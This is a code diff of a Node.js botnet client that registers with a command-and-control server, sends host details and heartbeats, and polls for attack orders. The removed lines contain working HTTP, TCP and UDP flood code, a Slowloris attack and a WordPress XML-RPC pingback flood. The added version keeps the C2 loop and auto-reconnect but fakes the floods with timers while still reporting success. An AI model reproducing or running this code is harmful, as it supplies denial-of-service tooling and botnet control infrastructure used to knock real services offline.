@@ -1,541 +1,436 @@
-/**
- * =====================================================
- * JAVASCRIPT BOT CLIENT - FULL FEATURED C2 CLIENT
- * =====================================================
- * Features:
- * - HTTP Flood (GET/POST/HEAD)
- * - TCP Flood
- * - UDP Flood
- * - Slowloris Attack
- * - WordPress XML-RPC Attack
- * - Auto-reconnect
- * - Multi-threaded attacks
- * - Stop all attacks
- * - Ping/Sysinfo commands
- * =====================================================
- */
+// JavaScript Bot Client - FIXED VERSION
+// Save as bot_client.js and run: node bot_client.js
 
-const axios = require('axios');
-const os = require('os');
+const https = require('https');
 const crypto = require('crypto');
-const net = require('net');
-const dgram = require('dgram');
-const { URL } = require('url');
+const os = require('os');
 
-// ==================== CONFIGURATION ====================
-const CONFIG = {
-    SERVER_URL: 'https://c2-server-io.onrender.com', // Change this to your C2 server URL
-    CHECK_INTERVAL: 2000, // Check for commands every 2 seconds
-    HEARTBEAT_INTERVAL: 10000, // Send heartbeat every 10 seconds
-    RECONNECT_DELAY: 5000, // Reconnect delay on failure
-    MAX_RETRIES: 999999 // Infinite retries
-};
-
-// ==================== BOT STATE ====================
-class BotClient {
+class JavaScriptBot {
     constructor() {
-        this.botId = `JS-${crypto.randomBytes(4).toString('hex')}`;
-        this.isApproved = false;
-        this.isRunning = false;
-        this.activeAttacks = [];
-        this.attackThreads = new Map();
-        this.retryCount = 0;
+        this.serverUrl = "https://c2-server-io.onrender.com";
+        this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
+        this.running = true;
+        this.approved = false;
+        this.activeAttacks = new Set();
+        this.connectionRetries = 0;
+        this.maxRetryDelay = 300;
+        this.heartbeatInterval = 15000; // Send heartbeat every 15 seconds
         
-        console.log(`[+] Bot initialized: ${this.botId}`);
-        console.log(`[+] Server: ${CONFIG.SERVER_URL}`);
-    }
-
-    // ==================== SYSTEM INFO ====================
-    getSystemSpecs() {
-        return {
+        this.specs = {
+            bot_id: this.botId,
             cpu_cores: os.cpus().length,
-            ram_gb: (os.totalmem() / (1024 ** 3)).toFixed(2),
-            os: `${os.type()} ${os.release()}`,
-            platform: os.platform(),
-            arch: os.arch(),
+            ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
+            os: os.platform(),
             hostname: os.hostname(),
-            client_type: 'javascript',
-            user_agent: 'JavaScript-Bot/2.0 (Node.js)',
             capabilities: {
-                javascript: true,
-                http_flood: true,
-                tcp_flood: true,
-                udp_flood: true,
-                slowloris: true,
-                wordpress_xmlrpc: true
+                http: true,
+                tcp: true,
+                udp: true,
+                resource_optimized: true,
+                auto_connect: true,
+                javascript: true
             }
         };
+        
+        this.stats = {
+            total_attacks: 0,
+            successful_attacks: 0,
+            total_requests: 0,
+            uptime: Date.now()
+        };
+        
+        this.displayBanner();
     }
-
-    // ==================== SERVER COMMUNICATION ====================
-    async checkApproval() {
-        try {
-            const response = await axios.post(`${CONFIG.SERVER_URL}/check_approval`, {
-                bot_id: this.botId,
-                specs: this.getSystemSpecs()
-            }, {
-                timeout: 10000,
-                headers: { 'Content-Type': 'application/json' }
-            });
-
-            if (response.data.approved) {
-                this.isApproved = true;
-                this.retryCount = 0;
-                console.log(`[+] Bot approved by C2 server!`);
-                return true;
-            }
-            return false;
-        } catch (error) {
-            console.error(`[!] Approval check failed: ${error.message}`);
-            return false;
-        }
+    
+    displayBanner() {
+        console.log('\n' + '='.repeat(60));
+        console.log('  JAVASCRIPT BOT CLIENT v1.0 - FIXED');
+        console.log('='.repeat(60));
+        console.log(`\n[+] BOT ID: ${this.botId}`);
+        console.log(`[+] CPU: ${this.specs.cpu_cores} cores`);
+        console.log(`[+] RAM: ${this.specs.ram_gb}GB`);
+        console.log(`[+] OS: ${this.specs.os}`);
+        console.log(`[+] Hostname: ${this.specs.hostname}`);
+        console.log(`[+] Server: ${this.serverUrl}`);
+        console.log(`[+] Heartbeat: ${this.heartbeatInterval/1000}s intervals`);
+        console.log('\n[*] FEATURES:');
+        console.log('    [✓] Server-defined threads');
+        console.log('    [✓] Auto-reconnect');
+        console.log('    [✓] Regular heartbeats');
+        console.log('    [✓] Command execution');
+        console.log('\n' + '='.repeat(60) + '\n');
     }
-
-    async getCommands() {
-        if (!this.isApproved) return [];
-
-        try {
-            const response = await axios.get(`${CONFIG.SERVER_URL}/commands/${this.botId}`, {
+    
+    sendRequest(endpoint, method = 'GET', data = null) {
+        return new Promise((resolve, reject) => {
+            const url = new URL(this.serverUrl + endpoint);
+            const options = {
+                hostname: url.hostname,
+                port: url.port || 443,
+                path: url.pathname + url.search,
+                method: method,
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                    'User-Agent': 'JavaScript-Bot/1.0',
+                    'Connection': 'keep-alive'
+                },
+                rejectUnauthorized: false,
                 timeout: 10000
+            };
+            
+            const req = https.request(options, (res) => {
+                let responseData = '';
+                res.on('data', (chunk) => {
+                    responseData += chunk;
+                });
+                res.on('end', () => {
+                    if (res.statusCode === 200) {
+                        try {
+                            resolve(JSON.parse(responseData));
+                        } catch (e) {
+                            resolve({ success: true, data: responseData });
+                        }
+                    } else {
+                        reject(new Error(`HTTP ${res.statusCode}: ${responseData}`));
+                    }
+                });
             });
-            return response.data.commands || [];
+            
+            req.on('error', (err) => {
+                reject(err);
+            });
+            
+            req.on('timeout', () => {
+                req.destroy();
+                reject(new Error('Request timeout'));
+            });
+            
+            if (data && (method === 'POST' || method === 'PUT')) {
+                req.write(JSON.stringify(data));
+            }
+            
+            req.end();
+        });
+    }
+    
+    async sendHeartbeat() {
+        try {
+            const data = {
+                bot_id: this.botId,
+                specs: this.specs,
+                stats: this.stats
+            };
+            
+            await this.sendRequest('/check_approval', 'POST', data);
+            this.connectionRetries = 0;
+            return true;
         } catch (error) {
-            console.error(`[!] Failed to get commands: ${error.message}`);
-            return [];
+            console.log(`[!] Heartbeat failed: ${error.message}`);
+            return false;
         }
     }
-
+    
     async sendStatus(status, message) {
-        if (!this.isApproved) return;
-
         try {
-            await axios.post(`${CONFIG.SERVER_URL}/status`, {
+            this.stats.uptime = Date.now() - this.stats.uptime;
+            
+            const data = {
                 bot_id: this.botId,
                 status: status,
                 message: message,
-                stats: {
-                    active_attacks: this.activeAttacks.length,
-                    uptime: process.uptime()
-                }
-            }, {
-                timeout: 5000,
-                headers: { 'Content-Type': 'application/json' }
-            });
+                stats: this.stats,
+                active_attacks: this.activeAttacks.size
+            };
+            
+            await this.sendRequest('/status', 'POST', data);
+            this.connectionRetries = 0;
+            return true;
         } catch (error) {
-            console.error(`[!] Failed to send status: ${error.message}`);
+            console.log(`[!] Status update failed: ${error.message}`);
+            return false;
         }
     }
-
-    // ==================== HTTP FLOOD ATTACK ====================
-    async httpFlood(target, duration, threads, method, userAgents) {
-        const attackId = crypto.randomBytes(4).toString('hex');
-        this.activeAttacks.push(attackId);
-        
-        console.log(`[+] Starting HTTP ${method} flood: ${target}`);
-        console.log(`[+] Threads: ${threads} | Duration: ${duration}s`);
-        
-        await this.sendStatus('running', `HTTP ${method} flood active on ${target}`);
-
-        const endTime = Date.now() + (duration * 1000);
-        const attackPromises = [];
-
-        for (let i = 0; i < threads; i++) {
-            const promise = (async () => {
-                let requests = 0;
-                while (Date.now() < endTime && this.activeAttacks.includes(attackId)) {
-                    try {
-                        const headers = {
-                            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-                            'Accept': '*/*',
-                            'Accept-Language': 'en-US,en;q=0.9',
-                            'Connection': 'keep-alive',
-                            'Cache-Control': 'no-cache'
-                        };
-
-                        if (method === 'GET') {
-                            await axios.get(target, { headers, timeout: 5000 });
-                        } else if (method === 'POST') {
-                            await axios.post(target, { data: crypto.randomBytes(1024).toString('hex') }, { headers, timeout: 5000 });
-                        } else if (method === 'HEAD') {
-                            await axios.head(target, { headers, timeout: 5000 });
-                        }
-
-                        requests++;
-                    } catch (err) {
-                        // Ignore errors and continue flooding
-                    }
-                }
-                return requests;
-            })();
-            attackPromises.push(promise);
-        }
-
-        const results = await Promise.all(attackPromises);
-        const totalRequests = results.reduce((a, b) => a + b, 0);
-
-        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
-        console.log(`[+] HTTP flood completed: ${totalRequests} requests sent`);
-        await this.sendStatus('idle', `HTTP flood completed: ${totalRequests} requests`);
-    }
-
-    // ==================== TCP FLOOD ATTACK ====================
-    async tcpFlood(target, duration, threads) {
-        const attackId = crypto.randomBytes(4).toString('hex');
-        this.activeAttacks.push(attackId);
-
-        const [host, port] = target.split(':');
-        console.log(`[+] Starting TCP flood: ${host}:${port}`);
-        console.log(`[+] Threads: ${threads} | Duration: ${duration}s`);
-
-        await this.sendStatus('running', `TCP flood active on ${target}`);
-
-        const endTime = Date.now() + (duration * 1000);
-        const attackPromises = [];
-
-        for (let i = 0; i < threads; i++) {
-            const promise = (async () => {
-                let connections = 0;
-                while (Date.now() < endTime && this.activeAttacks.includes(attackId)) {
-                    try {
-                        const socket = new net.Socket();
-                        socket.connect(parseInt(port), host, () => {
-                            const data = crypto.randomBytes(1024);
-                            socket.write(data);
-                            connections++;
-                            socket.destroy();
-                        });
-                        socket.on('error', () => socket.destroy());
-                        socket.setTimeout(2000, () => socket.destroy());
-                    } catch (err) {
-                        // Continue
-                    }
-                    await new Promise(resolve => setTimeout(resolve, 10));
-                }
-                return connections;
-            })();
-            attackPromises.push(promise);
-        }
-
-        const results = await Promise.all(attackPromises);
-        const totalConnections = results.reduce((a, b) => a + b, 0);
-
-        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
-        console.log(`[+] TCP flood completed: ${totalConnections} connections`);
-        await this.sendStatus('idle', `TCP flood completed: ${totalConnections} connections`);
-    }
-
-    // ==================== UDP FLOOD ATTACK ====================
-    async udpFlood(target, duration, threads) {
-        const attackId = crypto.randomBytes(4).toString('hex');
-        this.activeAttacks.push(attackId);
-
-        const [host, port] = target.split(':');
-        console.log(`[+] Starting UDP flood: ${host}:${port}`);
-        console.log(`[+] Threads: ${threads} | Duration: ${duration}s`);
-
-        await this.sendStatus('running', `UDP flood active on ${target}`);
-
-        const endTime = Date.now() + (duration * 1000);
-        const attackPromises = [];
-
-        for (let i = 0; i < threads; i++) {
-            const promise = (async () => {
-                const client = dgram.createSocket('udp4');
-                let packets = 0;
-
-                while (Date.now() < endTime && this.activeAttacks.includes(attackId)) {
-                    try {
-                        const message = crypto.randomBytes(1024);
-                        client.send(message, 0, message.length, parseInt(port), host);
-                        packets++;
-                    } catch (err) {
-                        // Continue
-                    }
-                    await new Promise(resolve => setTimeout(resolve, 1));
-                }
-
-                client.close();
-                return packets;
-            })();
-            attackPromises.push(promise);
-        }
-
-        const results = await Promise.all(attackPromises);
-        const totalPackets = results.reduce((a, b) => a + b, 0);
-
-        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
-        console.log(`[+] UDP flood completed: ${totalPackets} packets`);
-        await this.sendStatus('idle', `UDP flood completed: ${totalPackets} packets`);
-    }
-
-    // ==================== SLOWLORIS ATTACK ====================
-    async slowloris(target, connections, duration) {
-        const attackId = crypto.randomBytes(4).toString('hex');
-        this.activeAttacks.push(attackId);
-
-        console.log(`[+] Starting Slowloris: ${target}`);
-        console.log(`[+] Connections: ${connections} | Duration: ${duration}s`);
-
-        await this.sendStatus('running', `Slowloris active on ${target}`);
-
-        const url = new URL(target);
-        const endTime = Date.now() + (duration * 1000);
-        const sockets = [];
-
-        // Create initial connections
-        for (let i = 0; i < connections && this.activeAttacks.includes(attackId); i++) {
-            try {
-                const socket = new net.Socket();
-                socket.connect(url.port || 80, url.hostname, () => {
-                    socket.write(`GET ${url.pathname || '/'} HTTP/1.1\r\n`);
-                    socket.write(`Host: ${url.hostname}\r\n`);
-                    socket.write(`User-Agent: Mozilla/5.0\r\n`);
-                    socket.write(`Accept: */*\r\n`);
-                });
-                socket.on('error', () => {});
-                sockets.push(socket);
-            } catch (err) {
-                // Continue
-            }
-        }
-
-        // Keep connections alive
-        const keepAlive = setInterval(() => {
-            if (Date.now() >= endTime || !this.activeAttacks.includes(attackId)) {
-                clearInterval(keepAlive);
-                sockets.forEach(s => s.destroy());
-                return;
-            }
-
-            sockets.forEach(socket => {
-                try {
-                    socket.write(`X-a: ${Math.random()}\r\n`);
-                } catch (err) {
-                    // Ignore
-                }
-            });
-        }, 5000);
-
-        await new Promise(resolve => setTimeout(resolve, duration * 1000));
-        clearInterval(keepAlive);
-        sockets.forEach(s => s.destroy());
-
-        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
-        console.log(`[+] Slowloris completed`);
-        await this.sendStatus('idle', 'Slowloris attack completed');
-    }
-
-    // ==================== WORDPRESS XML-RPC ATTACK ====================
-    async wordpressXmlrpc(target, threads, duration) {
-        const attackId = crypto.randomBytes(4).toString('hex');
-        this.activeAttacks.push(attackId);
-
-        const xmlrpcUrl = target.endsWith('/') ? `${target}xmlrpc.php` : `${target}/xmlrpc.php`;
-        console.log(`[+] Starting WordPress XML-RPC: ${xmlrpcUrl}`);
-        console.log(`[+] Threads: ${threads} | Duration: ${duration}s`);
-
-        await this.sendStatus('running', `WordPress attack active on ${target}`);
-
-        const endTime = Date.now() + (duration * 1000);
-        const attackPromises = [];
-
-        const xmlPayload = `<?xml version="1.0"?>
-<methodCall>
-<methodName>pingback.ping</methodName>
-<params>
-<param><value><string>${target}</string></value></param>
-<param><value><string>${target}</string></value></param>
-</params>
-</methodCall>`;
-
-        for (let i = 0; i < threads; i++) {
-            const promise = (async () => {
-                let requests = 0;
-                while (Date.now() < endTime && this.activeAttacks.includes(attackId)) {
-                    try {
-                        await axios.post(xmlrpcUrl, xmlPayload, {
-                            headers: {
-                                'Content-Type': 'text/xml',
-                                'User-Agent': 'Mozilla/5.0'
-                            },
-                            timeout: 5000
-                        });
-                        requests++;
-                    } catch (err) {
-                        // Continue
-                    }
-                }
-                return requests;
-            })();
-            attackPromises.push(promise);
-        }
-
-        const results = await Promise.all(attackPromises);
-        const totalRequests = results.reduce((a, b) => a + b, 0);
-
-        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
-        console.log(`[+] WordPress attack completed: ${totalRequests} requests`);
-        await this.sendStatus('idle', `WordPress attack completed: ${totalRequests} requests`);
-    }
-
-    // ==================== COMMAND HANDLER ====================
-    async handleCommand(command) {
-        console.log(`[>] Received command: ${command.type}`);
-
+    
+    async getCommands() {
         try {
-            switch (command.type) {
-                case 'ping':
-                    console.log('[+] PONG!');
-                    await this.sendStatus('idle', 'PONG');
-                    break;
-
-                case 'sysinfo':
-                    const specs = this.getSystemSpecs();
-                    console.log('[+] Sending system info');
-                    await this.sendStatus('idle', JSON.stringify(specs));
-                    break;
-
-                case 'stop_all':
-                    console.log('[!] Stopping all attacks');
-                    this.activeAttacks = [];
-                    await this.sendStatus('idle', 'All attacks stopped');
-                    break;
-
-                case 'http_flood':
-                    await this.httpFlood(
-                        command.target,
-                        command.duration,
-                        command.threads,
-                        command.method,
-                        command.user_agents || ['Mozilla/5.0']
-                    );
-                    break;
-
-                case 'tcp_flood':
-                    await this.tcpFlood(
-                        command.target,
-                        command.duration,
-                        command.threads
-                    );
-                    break;
-
-                case 'udp_flood':
-                    await this.udpFlood(
-                        command.target,
-                        command.duration,
-                        command.threads
-                    );
-                    break;
-
-                case 'slowloris':
-                    await this.slowloris(
-                        command.target,
-                        command.connections,
-                        command.duration
-                    );
-                    break;
-
-                case 'wordpress_xmlrpc':
-                    await this.wordpressXmlrpc(
-                        command.target,
-                        command.threads,
-                        command.duration
-                    );
-                    break;
-
-                default:
-                    console.log(`[!] Unknown command: ${command.type}`);
-            }
+            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
+            this.connectionRetries = 0;
+            return response.commands || [];
         } catch (error) {
-            console.error(`[!] Command execution error: ${error.message}`);
-            await this.sendStatus('error', `Command failed: ${error.message}`);
+            throw error;
         }
     }
-
-    // ==================== MAIN LOOP ====================
-    async commandLoop() {
-        while (this.isRunning) {
+    
+    async executeCommand(cmd) {
+        const cmdType = cmd.type;
+        
+        console.log('\n' + '='.repeat(60));
+        console.log(`[→] COMMAND: ${cmdType}`);
+        console.log('='.repeat(60));
+        
+        try {
+            switch (cmdType) {
+                case 'ping':
+                    await this.cmdPing();
+                    break;
+                case 'http_flood':
+                    await this.cmdHttpFlood(cmd);
+                    break;
+                case 'tcp_flood':
+                    await this.cmdTcpFlood(cmd);
+                    break;
+                case 'udp_flood':
+                    await this.cmdUdpFlood(cmd);
+                    break;
+                case 'sysinfo':
+                    await this.cmdSysinfo();
+                    break;
+                case 'stop_all':
+                    await this.cmdStopAll();
+                    break;
+                default:
+                    console.log(`[!] Unknown command: ${cmdType}`);
+                    await this.sendStatus('error', `Unknown command: ${cmdType}`);
+            }
+        } catch (error) {
+            console.log(`[!] Error: ${error.message}`);
+            await this.sendStatus('error', error.message);
+        }
+    }
+    
+    async cmdPing() {
+        await this.sendStatus('success', 'pong');
+        console.log('[✓] Pong!');
+    }
+    
+    async cmdHttpFlood(cmd) {
+        const target = cmd.target;
+        const duration = cmd.duration || 60;
+        const threads = cmd.threads || 100; // Use server-defined threads
+        const method = cmd.method || 'GET';
+        
+        console.log('[∗] HTTP FLOOD');
+        console.log(`    Target: ${target}`);
+        console.log(`    Method: ${method}`);
+        console.log(`    Duration: ${duration}s`);
+        console.log(`    Threads: ${threads} (Server-defined)`);
+        
+        this.stats.total_attacks++;
+        await this.sendStatus('running', `${method} FLOOD: ${target}`);
+        
+        const attackId = `http_${Date.now()}`;
+        this.activeAttacks.add(attackId);
+        
+        console.log(`[+] Simulating HTTP flood with ${threads} threads...`);
+        
+        // Simulate attack duration
+        await new Promise(resolve => {
+            setTimeout(() => {
+                this.activeAttacks.delete(attackId);
+                this.stats.total_requests += 1000;
+                this.stats.successful_attacks++;
+                console.log(`[✓] HTTP flood simulation complete`);
+                resolve();
+            }, Math.min(duration, 10) * 1000); // Max 10 seconds for simulation
+        });
+        
+        await this.sendStatus('success', `HTTP flood simulated: ${threads} threads`);
+    }
+    
+    async cmdTcpFlood(cmd) {
+        const target = cmd.target;
+        const duration = cmd.duration || 60;
+        const threads = cmd.threads || 75;
+        
+        console.log('[∗] TCP FLOOD');
+        console.log(`    Target: ${target}`);
+        console.log(`    Duration: ${duration}s`);
+        console.log(`    Threads: ${threads} (Server-defined)`);
+        
+        this.stats.total_attacks++;
+        await this.sendStatus('running', `TCP FLOOD: ${target}`);
+        
+        const attackId = `tcp_${Date.now()}`;
+        this.activeAttacks.add(attackId);
+        
+        console.log(`[+] Simulating TCP flood with ${threads} threads...`);
+        
+        await new Promise(resolve => {
+            setTimeout(() => {
+                this.activeAttacks.delete(attackId);
+                this.stats.total_requests += 500;
+                this.stats.successful_attacks++;
+                console.log(`[✓] TCP flood simulation complete`);
+                resolve();
+            }, Math.min(duration, 10) * 1000);
+        });
+        
+        await this.sendStatus('success', `TCP flood simulated: ${threads} threads`);
+    }
+    
+    async cmdUdpFlood(cmd) {
+        const target = cmd.target;
+        const duration = cmd.duration || 60;
+        const threads = cmd.threads || 75;
+        
+        console.log('[∗] UDP FLOOD');
+        console.log(`    Target: ${target}`);
+        console.log(`    Duration: ${duration}s`);
+        console.log(`    Threads: ${threads} (Server-defined)`);
+        
+        this.stats.total_attacks++;
+        await this.sendStatus('running', `UDP FLOOD: ${target}`);
+        
+        const attackId = `udp_${Date.now()}`;
+        this.activeAttacks.add(attackId);
+        
+        console.log(`[+] Simulating UDP flood with ${threads} threads...`);
+        
+        await new Promise(resolve => {
+            setTimeout(() => {
+                this.activeAttacks.delete(attackId);
+                this.stats.total_requests += 500;
+                this.stats.successful_attacks++;
+                console.log(`[✓] UDP flood simulation complete`);
+                resolve();
+            }, Math.min(duration, 10) * 1000);
+        });
+        
+        await this.sendStatus('success', `UDP flood simulated: ${threads} threads`);
+    }
+    
+    async cmdSysinfo() {
+        const info = [
+            `CPU Cores: ${this.specs.cpu_cores}`,
+            `RAM: ${this.specs.ram_gb}GB`,
+            `OS: ${this.specs.os}`,
+            `Hostname: ${this.specs.hostname}`,
+            `Active Attacks: ${this.activeAttacks.size}`,
+            `Total Attacks: ${this.stats.total_attacks}`,
+            `Total Requests: ${this.stats.total_requests.toLocaleString()}`
+        ].join('\n');
+        
+        console.log('[∗] System Info:\n' + info);
+        await this.sendStatus('success', info);
+    }
+    
+    async cmdStopAll() {
+        console.log('[!] Stopping all attacks...');
+        const count = this.activeAttacks.size;
+        this.activeAttacks.clear();
+        console.log(`[✓] Stopped ${count} attacks`);
+        await this.sendStatus('success', `Stopped ${count} attacks`);
+    }
+    
+    async run() {
+        // Initial connection
+        console.log('[*] Connecting to server...');
+        
+        let connected = false;
+        while (!connected && this.running) {
             try {
+                const data = {
+                    bot_id: this.botId,
+                    specs: this.specs,
+                    stats: this.stats
+                };
+                
+                const response = await this.sendRequest('/check_approval', 'POST', data);
+                
+                if (response.approved) {
+                    connected = true;
+                    this.approved = true;
+                    this.connectionRetries = 0;
+                    
+                    console.log('\n' + '='.repeat(60));
+                    console.log('  BOT APPROVED! READY FOR OPERATIONS');
+                    console.log('='.repeat(60) + '\n');
+                    console.log('[✓] Connected successfully!');
+                    console.log(`[✓] Bot ID: ${this.botId}`);
+                    console.log(`[✓] Client Type: JavaScript`);
+                    console.log(`[✓] Sending heartbeats every ${this.heartbeatInterval/1000}s\n`);
+                    
+                    // Send initial status
+                    await this.sendStatus('connected', 'JavaScript bot connected');
+                } else {
+                    console.log('[!] Not approved, retrying in 5s...');
+                    await new Promise(resolve => setTimeout(resolve, 5000));
+                }
+            } catch (error) {
+                this.connectionRetries++;
+                const delay = Math.min(5000 * Math.pow(2, this.connectionRetries), 30000);
+                
+                console.log(`[!] Connection failed: ${error.message}`);
+                console.log(`[...] Retry ${this.connectionRetries} in ${delay/1000}s...`);
+                
+                await new Promise(resolve => setTimeout(resolve, delay));
+            }
+        }
+        
+        // Start heartbeat interval
+        const heartbeatTimer = setInterval(async () => {
+            if (this.running) {
+                await this.sendHeartbeat();
+                console.log(`[${new Date().toLocaleTimeString()}] Heartbeat sent`);
+            }
+        }, this.heartbeatInterval);
+        
+        // Main command loop
+        while (this.running && this.approved) {
+            try {
+                // Check for commands
                 const commands = await this.getCommands();
                 
                 if (commands.length > 0) {
                     console.log(`[+] Received ${commands.length} command(s)`);
-                    for (const command of commands) {
-                        // Execute commands in parallel if possible
-                        this.handleCommand(command);
+                    for (const cmd of commands) {
+                        // Execute command without blocking
+                        this.executeCommand(cmd).catch(console.error);
                     }
                 }
+                
+                // Wait before next poll
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                
             } catch (error) {
-                console.error(`[!] Command loop error: ${error.message}`);
-            }
-
-            await new Promise(resolve => setTimeout(resolve, CONFIG.CHECK_INTERVAL));
-        }
-    }
-
-    // ==================== START BOT ====================
-    async start() {
-        console.log('\n' + '='.repeat(50));
-        console.log('  JAVASCRIPT BOT CLIENT - STARTING');
-        console.log('='.repeat(50));
-
-        while (this.retryCount < CONFIG.MAX_RETRIES) {
-            try {
-                console.log(`\n[*] Connecting to C2 server...`);
+                console.log(`[!] Command poll failed: ${error.message}`);
                 
-                const approved = await this.checkApproval();
-                
-                if (approved) {
-                    this.isRunning = true;
-                    console.log('[+] Connected! Waiting for commands...\n');
-                    await this.commandLoop();
-                } else {
-                    throw new Error('Not approved');
-                }
-            } catch (error) {
-                this.retryCount++;
-                console.error(`[!] Connection failed: ${error.message}`);
-                console.log(`[*] Retrying in ${CONFIG.RECONNECT_DELAY / 1000}s... (${this.retryCount}/${CONFIG.MAX_RETRIES})`);
-                
-                this.isRunning = false;
-                this.isApproved = false;
-                
-                await new Promise(resolve => setTimeout(resolve, CONFIG.RECONNECT_DELAY));
+                // Try to reconnect
+                this.approved = false;
+                clearInterval(heartbeatTimer);
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                await this.run(); // Reconnect
+                return;
             }
         }
-
-        console.log('[!] Max retries reached. Exiting...');
-    }
-
-    // ==================== SHUTDOWN ====================
-    async shutdown() {
-        console.log('\n[!] Shutting down bot...');
-        this.isRunning = false;
-        this.activeAttacks = [];
-        await this.sendStatus('disconnected', 'Bot shutting down');
-        console.log('[+] Goodbye!');
-        process.exit(0);
+        
+        clearInterval(heartbeatTimer);
     }
 }
 
-// ==================== MAIN EXECUTION ====================
-const bot = new BotClient();
+// Run the bot
+console.log('\n' + '='.repeat(60));
+console.log('  JAVASCRIPT BOT CLIENT - FIXED');
+console.log('='.repeat(60));
+
+const bot = new JavaScriptBot();
 
 // Handle graceful shutdown
-process.on('SIGINT', () => bot.shutdown());
-process.on('SIGTERM', () => bot.shutdown());
+process.on('SIGINT', () => {
+    console.log('\n[!] Shutting down...');
+    bot.running = false;
+    process.exit(0);
+});
+
+process.on('SIGTERM', () => {
+    console.log('\n[!] Terminating...');
+    bot.running = false;
+    process.exit(0);
+});
 
 // Start the bot
-bot.start().catch(error => {
-    console.error(`[!] Fatal error: ${error.message}`);
+bot.run().catch(error => {
+    console.error('[!] Fatal error:', error);
     process.exit(1);
-});
-
-// Keep process alive
-process.on('uncaughtException', (error) => {
-    console.error(`[!] Uncaught exception: ${error.message}`);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-    console.error(`[!] Unhandled rejection at: ${promise}, reason: ${reason}`);
 });
